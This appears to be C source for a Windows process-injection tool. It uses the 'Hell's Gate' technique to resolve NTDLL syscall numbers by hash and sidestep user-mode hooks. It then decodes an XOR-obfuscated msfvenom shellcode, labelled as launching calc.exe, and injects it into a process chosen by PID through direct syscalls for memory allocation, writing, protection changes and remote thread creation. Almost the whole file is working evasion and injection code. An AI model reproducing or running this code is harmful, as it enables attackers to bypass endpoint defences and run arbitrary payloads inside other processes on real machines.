#pragma once
#include <Windows.h>
#include "structs.h"
#include <stdio.h>

/*--------------------------------------------------------------------
  VX Tables
--------------------------------------------------------------------*/
typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtOpenProcess;
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtWriteVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, * PVX_TABLE;

/*--------------------------------------------------------------------
  Function prototypes.
--------------------------------------------------------------------*/
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(
	_In_ PVOID                     pModuleBase,
	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);
BOOL GetVxTableEntry(
	_In_ PVOID pModuleBase,
	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
	_In_ PVX_TABLE_ENTRY pVxTableEntry
);
BOOL Payload(
	_In_ PVX_TABLE pVxTable
);
PVOID VxMoveMemory(
	_Inout_ PVOID dest,
	_In_    const PVOID src,
	_In_    SIZE_T len
);

/*--------------------------------------------------------------------
  External functions' prototype.
--------------------------------------------------------------------*/
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

int main(int argc, char* argv[]){

	DWORD pid = (DWORD)atoi(argv[1]);
	printf("PID: %p\n", atoi(argv[1]));
	printf("PID: %i\n", pid);

	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return 0x1;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x01;

	VX_TABLE Table = { 0 };
	Table.NtOpenProcess.dwHash = 0xe34a63b02f880d87;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtOpenProcess))
		return 0x1;

	Table.NtAllocateVirtualMemory.dwHash = 0xada9186708142e6f;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
		return 0x1;

	Table.NtWriteVirtualMemory.dwHash = 0x94d87496e325916d;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWriteVirtualMemory))
		return 0x1;

	Table.NtCreateThreadEx.dwHash = 0xfb52ad03e59f846f;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
		return 0x1;

	Table.NtProtectVirtualMemory.dwHash = 0x8922ed8ba3779cf7;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
		return 0x1;

	Table.NtWaitForSingleObject.dwHash = 0xe83a3b01d02d6d07;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
		return 0x1;

	Payload(&Table, pid);
	return 0x00;
}

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x7114953477341234;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x2) + dwHash) + c;

	return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					printf("SystemCall: 0x%04X\n", pVxTableEntry->wSystemCall);
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}

// XOR-encoded payload.
//msfvenom - p windows / x64 / exec CMD = "calc.exe" - f c
unsigned char buf[] = "\x06\xb2\x79\x1e\x0a\x12\x3a\xfa\xfa\xfa\xbb\xab\xbb\xaa\xa8\xab\xac\xb2\xcb\x28\x9f\xb2\x71\xa8\x9a\xb2\x71\xa8\xe2\xb2\x71\xa8\xda\xb2\x71\x88\xaa\xb2\xf5\x4d\xb0\xb0\xb7\xcb\x33\xb2\xcb\x3a\x56\xc6\x9b\x86\xf8\xd6\xda\xbb\x3b\x33\xf7\xbb\xfb\x3b\x18\x17\xa8\xbb\xab\xb2\x71\xa8\xda\x71\xb8\xc6\xb2\xfb\x2a\x71\x7a\x72\xfa\xfa\xfa\xb2\x7f\x3a\x8e\x9d\xb2\xfb\x2a\xaa\x71\xb2\xe2\xbe\x71\xba\xda\xb3\xfb\x2a\x19\xac\xb2\x05\x33\xbb\x71\xce\x72\xb2\xfb\x2c\xb7\xcb\x33\xb2\xcb\x3a\x56\xbb\x3b\x33\xf7\xbb\xfb\x3b\xc2\x1a\x8f\x0b\xb6\xf9\xb6\xde\xf2\xbf\xc3\x2b\x8f\x22\xa2\xbe\x71\xba\xde\xb3\xfb\x2a\x9c\xbb\x71\xf6\xb2\xbe\x71\xba\xe6\xb3\xfb\x2a\xbb\x71\xfe\x72\xb2\xfb\x2a\xbb\xa2\xbb\xa2\xa4\xa3\xa0\xbb\xa2\xbb\xa3\xbb\xa0\xb2\x79\x16\xda\xbb\xa8\x05\x1a\xa2\xbb\xa3\xa0\xb2\x71\xe8\x13\xad\x05\x05\x05\xa7\xb2\x40\xfb\xfa\xfa\xfa\xfa\xfa\xfa\xfa\xb2\x77\x77\xfb\xfb\xfa\xfa\xbb\x40\xcb\x71\x95\x7d\x05\x2f\x41\x0a\x4f\x58\xac\xbb\x40\x5c\x6f\x47\x67\x05\x2f\xb2\x79\x3e\xd2\xc6\xfc\x86\xf0\x7a\x01\x1a\x8f\xff\x41\xbd\xe9\x88\x95\x90\xfa\xa3\xbb\x73\x20\x05\x2f\x99\x9b\x96\x99\xd4\x9f\x82\x9f\xfa";

BOOL Payload(PVX_TABLE pVxTable, DWORD pid) {

	NTSTATUS status = 0x00000000;
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
	CLIENT_ID cid;
	cid.UniqueProcess = (PVOID)pid;
	cid.UniqueThread = 0;

	// Open process handle
	HellsGate(pVxTable->NtOpenProcess.wSystemCall);
	status = HellDescent(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
	printf("hProcess: %p\n", hProcess);

	// Allocate memory for the shellcode
	PVOID lpAddress = NULL;
	ULONG sDataSize = sizeof(buf);
	HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
	status = HellDescent(hProcess, &lpAddress, 0, &sDataSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), (ULONG)PAGE_READWRITE);
	printf("sDataSize: %i\n", sDataSize);
	printf("lpAddress: %p\n", lpAddress);

	// XOR the buffer with 0xfa
	// sizeof(buf) - 1; // Exclude the null terminator
	for (size_t i = 0; i < sizeof(buf) - 1; i++) {
		buf[i] ^= 0xfa;
	}

	// Write Memory
	ULONG bytesWritten;
	HellsGate(pVxTable->NtWriteVirtualMemory.wSystemCall);
	status = HellDescent(hProcess, lpAddress, (PVOID)buf, sizeof(buf), &bytesWritten);
	printf("bytesWritten: %p\n", bytesWritten);

	// Change page permissions
	ULONG ulOldProtect = 0;
	HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
	status = HellDescent(hProcess, &lpAddress, &sDataSize, (ULONG)PAGE_EXECUTE_READ, &ulOldProtect);
	printf("ulOldProtect: %i\n", ulOldProtect);
	printf("status: 0x%08X\n", status);

	// Create thread
	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
	status = HellDescent(&hHostThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
	printf("hHostThread: %p\n", hHostThread);

	// Wait for 1 seconds
	LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;
	HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall);
	status = HellDescent(hHostThread, FALSE, &Timeout);

	return TRUE;
}

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}